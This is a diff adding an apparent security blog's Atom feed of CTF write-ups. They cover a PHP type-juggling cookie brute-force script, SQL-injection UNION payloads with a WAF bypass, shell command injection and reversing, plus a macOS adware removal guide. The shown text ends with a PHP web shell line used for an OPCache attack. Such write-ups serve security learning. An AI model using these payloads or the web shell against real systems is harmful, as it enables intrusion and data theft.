@@ -1,0 +1,560 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://g0kkk.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://g0kkk.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-04-26T09:50:16+00:00</updated><id>https://g0kkk.github.io/feed.xml</id><title type="html">Gokul Krishna</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design.
+</subtitle><entry><title type="html">CONFidence CTF 2019 ‘The Admin Panel’ Writeup</title><link href="https://g0kkk.github.io/blog/2019/CONFidence-CTF-admin-panel/" rel="alternate" type="text/html" title="CONFidence CTF 2019 ‘The Admin Panel’ Writeup" /><published>2019-03-16T05:05:00+00:00</published><updated>2019-03-16T05:05:00+00:00</updated><id>https://g0kkk.github.io/blog/2019/CONFidence%20CTF%20admin%20panel</id><content type="html" xml:base="https://g0kkk.github.io/blog/2019/CONFidence-CTF-admin-panel/"><![CDATA[<p>Right after iCTF, there was Confidence CTF going on by P4! I was kinda late to look into the challenges and there was hardly ~3 hours left. I went with the one which had most solves, <strong>The Admin Panel</strong>.
+<br /><br /></p>
+
+<figure class="foto-legenda">
+	<img src="../assets/conf/ChalDesc.png" alt="" />
+</figure>
+
+<p><br />
+<br />
+We were greeted with a normal directory listing page where we had two files, <code class="language-plaintext highlighter-rouge">login.php</code> &amp; <code class="language-plaintext highlighter-rouge">login.php.bak</code>.<br /><br /></p>
+
+<figure class="foto-legenda">
+	<img src="../assets/conf/welcomescreen.png" alt="" />
+</figure>
+
+<p><br /><br /></p>
+
+<p>I decided to take up as usual, <code class="language-plaintext highlighter-rouge">login.php</code>, but had the message pop up <code class="language-plaintext highlighter-rouge">Not authenticated.</code>. <br />
+<br />
+<br /></p>
+
+<figure class="foto-legenda">
+	<img src="../assets/conf/notauth.png" alt="" />
+</figure>
+
+<p><br />
+<br /></p>
+
+<p>Fair enough, I downloaded the <code class="language-plaintext highlighter-rouge">login.php.bak</code> and we have the source code with us!<br /><br /></p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="k">include</span> <span class="s1">'../func.php'</span><span class="p">;</span>
+<span class="k">include</span> <span class="s1">'../config.php'</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'otadmin'</span><span class="p">])</span> <span class="p">{</span>
+    <span class="k">exit</span><span class="p">(</span><span class="s2">"Not authenticated.</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^{"hash": [0-9A-Z\"]+}$/'</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'otadmin'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"COOKIE TAMPERING xD IM A SECURITY EXPERT</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="nv">$session_data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="err">$\</span><span class="n">_COOKIE</span><span class="p">[</span><span class="s1">'otadmin'</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$session_data</span> <span class="o">===</span> <span class="kc">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"COOKIE TAMPERING xD IM A SECURITY EXPERT</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">();</span> <span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$session_data</span><span class="p">[</span><span class="s1">'hash'</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nb">MD5</span><span class="p">(</span><span class="nv">$cfg_pass</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="k">echo</span><span class="p">(</span><span class="s2">"I CAN EVEN GIVE YOU A HINT XD </span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nb">MD5</span><span class="p">(</span><span class="s1">'xDdddddd'</span><span class="p">));</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nb">MD5</span><span class="p">(</span><span class="nv">$cfg_pass</span><span class="p">)[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">exit</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nf">display_admin</span><span class="p">();</span></code></pre></figure>
+
+<p><br />
+<br />
+Diving into the source code step by step, the <code class="language-plaintext highlighter-rouge">Not authenticated.</code> message comes out as the cookie, <code class="language-plaintext highlighter-rouge">otadmin</code> is not there. Okay, good enough, I decided to create a cookie named <code class="language-plaintext highlighter-rouge">otadmin</code>.</p>
+
+<p>After having that moved into the page, I was greeted with the next message which was <code class="language-plaintext highlighter-rouge">COOKIE TAMPERING xD IM A SECURITY EXPERT</code>. So looking at that comparison, I understood that the cookie must have a key-value paid of <code class="language-plaintext highlighter-rouge">hash</code> as key and alphanumeric characters as value in it. And the very next line gets <code class="language-plaintext highlighter-rouge">$session_data</code> as a json decoded object. <br /></p>
+
+<p>I then decided to create a new cookie <code class="language-plaintext highlighter-rouge">otadmin</code> with value <code class="language-plaintext highlighter-rouge">{"hash": ""}</code>.</p>
+
+<p>Well, that threw me the result of the next condition, which we eventually need to bypass. But without knowing what <code class="language-plaintext highlighter-rouge">$cfg_pass</code> is, it is rather bs. <br /></p>
+
+<p>As a result, the hint was nothing but <br /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>Now we know what the hint is, what the for loop does, the interesting part was the last comparison was vulnerable to a loose comparison or rather <a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf"><strong>type juggling</strong></a>. The loose comparison would rather do something like: <em><strong>When comparing a string to a number, PHP will attempt to convert the string to a number then perform a numeric comparison</strong></em>.</p>
+
+<p><br />
+Good enough, makes it more easier not to bruteforce the md5 result and bypassing that is the only thing which is required now. From the hint, we know that the first three are <code class="language-plaintext highlighter-rouge">0</code> and hence having a value for hash in the range of 999 can do the trick that is required.</p>
+
+<p><br /></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#Author: gokul
+</span><span class="kn">import</span> <span class="n">requests</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">""</span>                                              <span class="c1">#point to the chal location
+</span>
+<span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">999</span><span class="p">):</span>
+        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'otadmin'</span><span class="p">:</span><span class="s">'{"hash": '</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">'}'</span><span class="p">}</span>  <span class="c1">#passing on the cookie
+</span>        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>           
+        <span class="k">if</span> <span class="s">'p4'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>                            <span class="c1">#checking for flag which starts with p4, likely to be in display_admin()
+</span>            <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">break</span></code></pre></figure>
+
+<p>Reach me out on <a href="https://twitter.com/gkgkrishna33"><strong>Twitter</strong></a> for any questions! Cheers.</p>]]></content><author><name></name></author><category term="Web, type juggling" /><summary type="html"><![CDATA[Right after iCTF, there was Confidence CTF going on by P4! I was kinda late to look into the challenges and there was hardly ~3 hours left. I went with the one which had most solves, The Admin Panel.]]></summary></entry><entry><title type="html">iCTF 2019 Echodoor</title><link href="https://g0kkk.github.io/blog/2019/iCTF-2019-Echodoor/" rel="alternate" type="text/html" title="iCTF 2019 Echodoor" /><published>2019-03-15T00:00:00+00:00</published><updated>2019-03-15T00:00:00+00:00</updated><id>https://g0kkk.github.io/blog/2019/iCTF%202019%20Echodoor</id><content type="html" xml:base="https://g0kkk.github.io/blog/2019/iCTF-2019-Echodoor/"><![CDATA[<p>Last week I had participated for iCTF along with <a href="https://pwndevils.com">pwndevils</a>. The game was pretty neat wherein you unlock A&amp;D challenges for interaction by solving the Jeopardy chals of which one was <em><code class="language-plaintext highlighter-rouge">echodoor</code></em>.</p>
+
+<p>We were given a file, <a href="https://github.com/gokulkrishna01/gokulkrishna01.github.io/blob/master/assets/source_code/CTF/ictf/echodoor/server.go"><em><code class="language-plaintext highlighter-rouge">server.go</code></em></a>, apparently what is running behind. To be honest, this was my first time dealing with a Golang as a server. I decided to tackle it as that was the only web challenge. Picking out the necessary stuffs from the given source code,</p>
+
+<figure class="highlight"><pre><code class="language-go" data-lang="go"><span class="k">func</span> <span class="n">dump_config</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="err">\</span><span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">Referer</span><span class="p">()</span> <span class="o">!=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">Host</span> <span class="o">+</span> <span class="s">"/menu"</span> <span class="p">{</span>
+                <span class="n">http</span><span class="o">.</span><span class="n">Redirect</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="s">"/menu"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusTemporaryRedirect</span><span class="p">)</span>
+                <span class="k">return</span>
+        <span class="p">}</span>
+        <span class="n">data</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">ioutil</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="s">"./config.tar.gz"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+                <span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"error: %v"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+                <span class="k">return</span>
+        <span class="p">}</span>
+        <span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The above piece of stuff was pretty much important. Setting the referrer with the right path would give out <em>config.tar.gz</em> file. Deflating and untaring it gave couple of files - <code class="language-plaintext highlighter-rouge">creds.txt</code> &amp; <code class="language-plaintext highlighter-rouge">flag.cfg</code>.</p>
+
+<p>Inside <code class="language-plaintext highlighter-rouge">creds.txt</code>, there was, supposedly, username and password - <code class="language-plaintext highlighter-rouge">SuperFast</code> &amp; <code class="language-plaintext highlighter-rouge">5up3rFuR10u$</code> - which we can use to login to the portal. Also, <code class="language-plaintext highlighter-rouge">flag.cfg</code> contained</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">directory: /
+file: flaA4aAaAaAAAAaag9G.txt</code></pre></figure>
+
+<p>At this point, it was evident what was supposed to be read. After logging in, we had a field wherein we could enter <em>ip</em>. From the above-mentioned source code, it was known that only 15 character was the limit (apparently I do not have any screenshots of the chal and it is taken down while I’m writing this). Entering characters through the website was not working as there was a client side validation being done and only alphabets along with <code class="language-plaintext highlighter-rouge">.</code> were not filtered.</p>
+
+<p>Well, interacting with the server directly made more sense. Apparently, there were two constraints of which one was <em>a character limit of 15</em> and the only binaries that were inside the server was <em>ping</em> and <em>sh</em>.</p>
+
+<p>After brain storming with my teammates, finally we got the flag by using the <code class="language-plaintext highlighter-rouge">-v</code> option in <code class="language-plaintext highlighter-rouge">sh</code>which would write input to standard error after reading it.</p>]]></content><author><name></name></author><category term="iCTF, 2019, Golang" /><summary type="html"><![CDATA[Last week I had participated for iCTF along with pwndevils. The game was pretty neat wherein you unlock A&amp;D challenges for interaction by solving the Jeopardy chals of which one was echodoor.]]></summary></entry><entry><title type="html">SECT 2018 EzDOS Reversing Challenge</title><link href="https://g0kkk.github.io/blog/2018/SECT-2018-EzDOS/" rel="alternate" type="text/html" title="SECT 2018 EzDOS Reversing Challenge" /><published>2018-09-14T00:06:31+00:00</published><updated>2018-09-14T00:06:31+00:00</updated><id>https://g0kkk.github.io/blog/2018/SECT%202018%20EzDOS</id><content type="html" xml:base="https://g0kkk.github.io/blog/2018/SECT-2018-EzDOS/"><![CDATA[<p>This <a href="https://github.com/gokulkrishna01/gokulkrishna01.github.io/tree/master/scripts/SECT/ezdos.com">challenge</a> was fairly easy and one of the first one to be solved as well along with my team mate,<a href="https://twitter.com/jkrshnmenon">4rbit3r</a>!</p>
+
+<p>We were given the file and as the name suggests, it was a <code class="language-plaintext highlighter-rouge">DOS</code> file. Firing it up in IDA would give you a fair idea of what actually happens and also would help you to see that a key is being taken as the input which is 13 in length.</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/EzDOS/Input.png" alt="" />
+</figure>
+
+<p>Further moving ahead, we can see that there is a comparison being done along with the characters shown below:</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/EzDOS/firstcom.png" alt="" />
+</figure>
+
+<figure class="foto-legenda">
+	<img src="../assets/EzDOS/scom.png" alt="" />
+</figure>
+
+<figure class="foto-legenda">
+	<img src="../assets/EzDOS/tcom.png" alt="" />
+</figure>
+
+<figure class="foto-legenda">
+	<img src="../assets/EzDOS/fcom.png" alt="" />
+</figure>
+
+<figure class="foto-legenda">
+	<img src="../assets/EzDOS/18f.png" alt="" />
+</figure>
+
+<p>In the beginning, I was trying to run the file using the DOS emulator which did not work and giving strings command gave me a few strings which was later important. There was a string being moved as you can see here which was nothing else but <code class="language-plaintext highlighter-rouge">1337SHELL</code> which was a guess as that was the only string which was not being used anywhere else. You can use r2 or gdb to print out what was there in that address, <code class="language-plaintext highlighter-rouge">26Bh</code>.</p>
+
+<p>The rest was pretty straighforward as the string <code class="language-plaintext highlighter-rouge">1337</code> stayed there and the rest of our input was being xored <code class="language-plaintext highlighter-rouge">SHEL</code> and compared with the strings shown below</p>
+
+<p>More of like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if inp[4] != '-':
+    exit(0)
+if inp[5] ^ buf[4] != 'f':
+    exit(0)
+</code></pre></div></div>
+
+<p>In order to get the</p>
+
+<p>We can get that the resulting four characters after the <code class="language-plaintext highlighter-rouge">-</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In [1]: chr(ord('S')^ord('f'))
+Out[1]: '5'
+
+In [2]: chr(ord('H')^ord('y'))
+Out[2]: '1'
+
+In [3]: chr(ord('E')^ord('t'))
+Out[3]: '1'
+
+In [4]: chr(ord('L')^ord('y'))
+Out[4]: '5'
+</code></pre></div></div>
+
+<p>Now we have four characters after <code class="language-plaintext highlighter-rouge">-</code> which is <code class="language-plaintext highlighter-rouge">5115</code>. We can see a flag file being opened and hence send the final string to the server where it is hosted.</p>
+
+<p>NOTE:String comparison is only done against first 9 characters</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/EzDOS/flagopen.png" alt="" />
+</figure>
+
+<p>The final string is, <code class="language-plaintext highlighter-rouge">1337-5115</code> :)</p>
+
+<p>Any questions, reach to us in Twitter.</p>]]></content><author><name></name></author><category term="Reverse Engineering, SECT, SECT 2018" /><summary type="html"><![CDATA[This challenge was fairly easy and one of the first one to be solved as well along with my team mate,4rbit3r!]]></summary></entry><entry><title type="html">ASIS Quals 2018 Good WAF</title><link href="https://g0kkk.github.io/blog/2018/ASIS-CTF-Quals-2018-Good-WAF/" rel="alternate" type="text/html" title="ASIS Quals 2018 Good WAF" /><published>2018-05-01T02:06:31+00:00</published><updated>2018-05-01T02:06:31+00:00</updated><id>https://g0kkk.github.io/blog/2018/ASIS%20CTF%20Quals%202018%20Good%20WAF</id><content type="html" xml:base="https://g0kkk.github.io/blog/2018/ASIS-CTF-Quals-2018-Good-WAF/"><![CDATA[<p>Challenge name: <code class="language-plaintext highlighter-rouge">Good WAF</code>
+Description: <code class="language-plaintext highlighter-rouge">WAFs cannot detect parameters filled with opaque data such as base64. Consequently, We've tuned our WAF to be more strong checking these inputs.</code>
+Link: http://167.99.12.110/</p>
+
+<p>We were greeted with the following page</p>
+<figure class="foto-legenda">
+	<img src="../assets/asisquals/GreetPage.png" alt="" />
+</figure>
+
+<p>written <code class="language-plaintext highlighter-rouge">GET news by object (base64(json_object)) parameter</code>.</p>
+
+<p>That was basically the first step for the challenge which was nothing else but a <code class="language-plaintext highlighter-rouge">GET</code> parameter <code class="language-plaintext highlighter-rouge">object</code> which should have a <code class="language-plaintext highlighter-rouge">json_object</code> encoded in <code class="language-plaintext highlighter-rouge">base64</code>. Initially I was trying to find the parameter which was in the application and that was, <code class="language-plaintext highlighter-rouge">data</code>. So passed <code class="language-plaintext highlighter-rouge">base64_encoded({"data":1})</code> and gave us the first data associated to that. It was a news and basically that showed us it was nothing, but SQLi.</p>
+
+<p>So first attempt was to enumerate and break the query. The <code class="language-plaintext highlighter-rouge">base64_encoded({"data":"1"})</code> and up gave the result of the corresponding number. While I had passed <code class="language-plaintext highlighter-rouge">base64_encoded({"data":"'"})</code>, it showed <code class="language-plaintext highlighter-rouge">blocked by WAF</code>. Well, that was pretty much sure and the easiest bypass was to include a space in between which was nothing but, <code class="language-plaintext highlighter-rouge">base64_encoded({ "data" : "'"})</code>. Bingo, the following page was reflected with that payload</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/asisquals/sql1.png" alt="" />
+</figure>
+
+<p>With this, I found the name of the <code class="language-plaintext highlighter-rouge">database()</code> (check below for the payload) which was <code class="language-plaintext highlighter-rouge">waf_portal</code> and also the table name(check below for payload), <code class="language-plaintext highlighter-rouge">access_logscredentialsnews</code> which more of looked like three table names and hence parting them, <code class="language-plaintext highlighter-rouge">access_logs</code>, <code class="language-plaintext highlighter-rouge">credentials</code> and <code class="language-plaintext highlighter-rouge">news</code> (understood this while trying to find the column name :P).</p>
+
+<p>The next step was to find what all are there in the three tables and grab them. Well, poking around for sometime gave me nothing in credentials (basically the flag). I was able to find a user named <code class="language-plaintext highlighter-rouge">valid_user</code> with password as <code class="language-plaintext highlighter-rouge">5f4dcc3b5aa765d61d8327deb882cf99</code> and role was <code class="language-plaintext highlighter-rouge">administrator</code>. Now with this, I had seen a class in the <code class="language-plaintext highlighter-rouge">style.css</code> file which was <code class="language-plaintext highlighter-rouge">.login-form</code> making me think that there should be a login form. The next step was to identify how to get to the login page and accessed the <code class="language-plaintext highlighter-rouge">access_log</code> table to find anything. There were a quite a number of <code class="language-plaintext highlighter-rouge">id</code>’s and iterating through each, in the <code class="language-plaintext highlighter-rouge">13</code>th one, I was able to find <code class="language-plaintext highlighter-rouge">?action=log-in</code>.</p>
+
+<p>The next step was to login with the username and password that we had got. The password looked more of like an <code class="language-plaintext highlighter-rouge">md5</code> and googling it cracked it which was <code class="language-plaintext highlighter-rouge">password</code>. So now we have the username:<code class="language-plaintext highlighter-rouge">valid_user</code> and password:<code class="language-plaintext highlighter-rouge">password</code>.</p>
+
+<p>The first way was trying to reach the <code class="language-plaintext highlighter-rouge">log-in</code> page. Accessing <code class="language-plaintext highlighter-rouge">http://167.99.12.110/?action=log-in</code> resulted in an error which was</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Notice: Undefined index: credentials in /var/www/html/index.php on line 21
+
+Notice: Undefined index: credentials in /var/www/html/index.php on line 22
+Invalid Credentials.
+</code></pre></div></div>
+
+<p>Very well, that error confirmed that we had to pass <code class="language-plaintext highlighter-rouge">username</code> and the <code class="language-plaintext highlighter-rouge">password</code> as <code class="language-plaintext highlighter-rouge">credentials</code> through a <code class="language-plaintext highlighter-rouge">GET</code> request. Going ahead, <code class="language-plaintext highlighter-rouge">http://167.99.12.110/?credentials=&amp;action=log-in</code> threw another interesting error,</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Notice: Uninitialized string offset: 0 in /var/www/html/index.php on line 21
+
+Notice: Uninitialized string offset: 1 in /var/www/html/index.php on line 22
+Invalid Credentials
+</code></pre></div></div>
+
+<p>which was nothing but passing it as an array.</p>
+
+<p>The final payload was:
+<code class="language-plaintext highlighter-rouge">http://167.99.12.110/?credentials[]=valid_user&amp;credentials[]=password&amp;action=log-in</code></p>
+
+<p>and Bingo, <code class="language-plaintext highlighter-rouge">ASIS{e279aaf1780c798e55477a7afc7b2b18}</code>.</p>
+
+<p>Payload for database:   <code class="language-plaintext highlighter-rouge">base64_encoded({  "data"  :  " ' UNION SELECT 1,database() -- "  })</code></p>
+
+<p>Payload for table name: <code class="language-plaintext highlighter-rouge">base64_encoded({ "data"  :  "' UNION select 1,table_name from information_schema.tables where table_schema=database() -- " })</code></p>
+
+<p>Reach me out on <a href="https://twitter.com/gkgkrishna33/status/991191742257946624">Twitter</a> for more queries.</p>]]></content><author><name></name></author><category term="ASIS Quals, SQLi, Web Application Firewall" /><summary type="html"><![CDATA[Challenge name: Good WAF Description: WAFs cannot detect parameters filled with opaque data such as base64. Consequently, We've tuned our WAF to be more strong checking these inputs. Link: http://167.99.12.110/]]></summary></entry><entry><title type="html">Search Page Injection Malware on MacOS</title><link href="https://g0kkk.github.io/blog/2018/MacOS-Malware/" rel="alternate" type="text/html" title="Search Page Injection Malware on MacOS" /><published>2018-05-01T00:06:31+00:00</published><updated>2018-05-01T00:06:31+00:00</updated><id>https://g0kkk.github.io/blog/2018/MacOS%20Malware</id><content type="html" xml:base="https://g0kkk.github.io/blog/2018/MacOS-Malware/"><![CDATA[<p>Recently, I was in a situation where I was being returned weird Google search results (in Chrome) where more ads have been pumped in to my searches which were not at all relevant. At first, I ignored but later, when it became a headache, literally impossible to get a proper search result, I thought I would dig in a bit and find what exactly is causing the issue.</p>
+
+<p>I then took FF and tried to reproduce the same, exactly the same way Google search responded, with a whole bunch of ads. On top of that, whichever links I take started to respond at a slower pace which was more of like how it comes when I use a proxy. I double checked with my extensions that I had in Chrome and FF, but to no avail I was able to find.</p>
+
+<p>I had tried updating a few apps which were pending for a long time but even that did not happen because of two reasons, one was because of no internet and the other, less space in my hard disk. I was pretty sure that there was enough space for things to get downloaded and moreover, my internet was working fine in all other devices.</p>
+
+<p>I then went to the <code class="language-plaintext highlighter-rouge">Network</code> section under <code class="language-plaintext highlighter-rouge">System Preferences</code></p>
+
+<figure class="foto-legenda">
+	<img src="../assets/malware/SystemPrefernces.png" alt="" />
+</figure>
+
+<p>only to find that, in the <code class="language-plaintext highlighter-rouge">advanced</code> section, two of the proxies were enabled.</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/malware/Network.png" alt="" />
+</figure>
+<figure class="foto-legenda">
+	<img src="../assets/malware/Proxy.png" alt="" />
+</figure>
+
+<p>So just to make things double sure, I deleted all the known Wi-Fi’s and then reconnected again. To my surprise, I was shown the following pop up with the message <code class="language-plaintext highlighter-rouge">spi is trying to modify the system network configuration</code> (although in the image, the message appears to be different as I wasn’t able to capture the screenshot then. <a href="https://www.google.co.in/url?sa=i&amp;source=images&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwi2ubTt5LTbAhXEWysKHTJGAcQQjRx6BAgBEAU&amp;url=https%3A%2F%2Fapple.stackexchange.com%2Fquestions%2F221950%2Fnetworksetup-is-trying-to-modify-the-system-network-configuration-dialogue-won&amp;psig=AOvVaw01VZucnmyTVypYYc4DCF9_&amp;ust=1528020403347491">Source</a>),</p>
+
+<figure class="foto-legenda">
+	<img src="../assets/malware/spi.png" alt="" />
+</figure>
+
+<p>A little bit of Googling helped me to find that it was indeed a malware which not only injects ad into the webpages that you search for but also adds a lot of junk files into your system.</p>
+
+<p>To delete this, only a few steps are required:</p>
+
+<p>Revoke the proxy ticks from the proxy tab as shown above, delete the <code class="language-plaintext highlighter-rouge">spi.app</code> from the applications tab in the <code class="language-plaintext highlighter-rouge">Finder</code> and in the terminal, type in the following commands:</p>
+
+<p><code class="language-plaintext highlighter-rouge">rm -rf ~/Library/LaunchAgents/spid.plist</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">rm -rf ~/LaunchAgents/spid-uninstall.plist</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">rm -rf /Applications/spi.app</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">rm -rf ~/Library/SPI/</code></p>
+
+<p>This should do along with a reboot.</p>
+
+<p>Thanks <a href="https://www.securemacos.com/search-page-injection-spi-malware-on-mac-os/">securemacos</a> for the help.</p>]]></content><author><name></name></author><category term="MacOS, Web Security" /><summary type="html"><![CDATA[Recently, I was in a situation where I was being returned weird Google search results (in Chrome) where more ads have been pumped in to my searches which were not at all relevant. At first, I ignored but later, when it became a headache, literally impossible to get a proper search result, I thought I would dig in a bit and find what exactly is causing the issue.]]></summary></entry><entry><title type="html">0CTF 2018 EZdoor Web Challenge</title><link href="https://g0kkk.github.io/blog/2018/0CTF-Quals-2018-EZDoor/" rel="alternate" type="text/html" title="0CTF 2018 EZdoor Web Challenge" /><published>2018-04-10T00:06:31+00:00</published><updated>2018-04-10T00:06:31+00:00</updated><id>https://g0kkk.github.io/blog/2018/0CTF%20Quals%202018%20EZDoor</id><content type="html" xml:base="https://g0kkk.github.io/blog/2018/0CTF-Quals-2018-EZDoor/"><![CDATA[<p>Challenge name: <code class="language-plaintext highlighter-rouge">EZdoor</code></p>
+
+<p>Link: <code class="language-plaintext highlighter-rouge">http://202.120.7.217:9527</code></p>
+
+<p>In this challenge, we are greeted with the <a href="https://github.com/gokulkrishna01/gokulkrishna01.github.io/tree/master/scripts/0CTF/source.php">source code</a>:</p>
+
+<p>Breaking down the code,</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"index.php"</span><span class="p">)){</span>
+  <span class="nb">touch</span><span class="p">(</span><span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"index.php"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>does create a new <code class="language-plaintext highlighter-rouge">index.php</code> file if not created already.</p>
+
+<p>This question was kind of similar to the one we had for ASIS CTF finals couple of years back. This made me realise that it was related to OPCache and since there was a <a href="http://gosecure.net/2016/04/27/binary-webshell-through-opcache-in-php-7/">writeup</a>, probably a research, on the same.</p>
+
+<p>So going line by line, we were provided with 5 different functionalities - <code class="language-plaintext highlighter-rouge">pwd</code> for the <code class="language-plaintext highlighter-rouge">path</code>, <code class="language-plaintext highlighter-rouge">phpinfo</code> which provides the info page, <code class="language-plaintext highlighter-rouge">reset</code> to clear the directory, <code class="language-plaintext highlighter-rouge">time</code> to show the timestamp (this will prove to be important later) &amp; <code class="language-plaintext highlighter-rouge">upload</code> option to upload our file.</p>
+
+<p>Understanding the problem deeper, <code class="language-plaintext highlighter-rouge">OPCache</code> is the built-in caching engine with PHP 7.0.* versions. It not only compiles PHP scripts and sets the resulting bytecode in memory but also, offers caching in the filesystem when specifying a destination folder in <code class="language-plaintext highlighter-rouge">PHP.ini</code> file.</p>
+
+<p>You can find the line <code class="language-plaintext highlighter-rouge">opcache.file_cache=/tmp/opcache</code> in <code class="language-plaintext highlighter-rouge">PHP.ini</code> file. Inside this folder, <code class="language-plaintext highlighter-rouge">OPCache</code> stores its compiled PHP scripts in the same folder where the PHP code is written. So essentially, a compiled version of <code class="language-plaintext highlighter-rouge">/var/www/index.php</code> will be stored in <code class="language-plaintext highlighter-rouge">/tmp/opcache/&lt;system_id&gt;/var/www/index.php.bin</code>.</p>
+
+<p>To generate a <code class="language-plaintext highlighter-rouge">phpbin</code> file, create a <code class="language-plaintext highlighter-rouge">index.php</code> file with contents:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+   system($_GET['cmd']);
+?&gt;
+</code></pre></div></div>
+
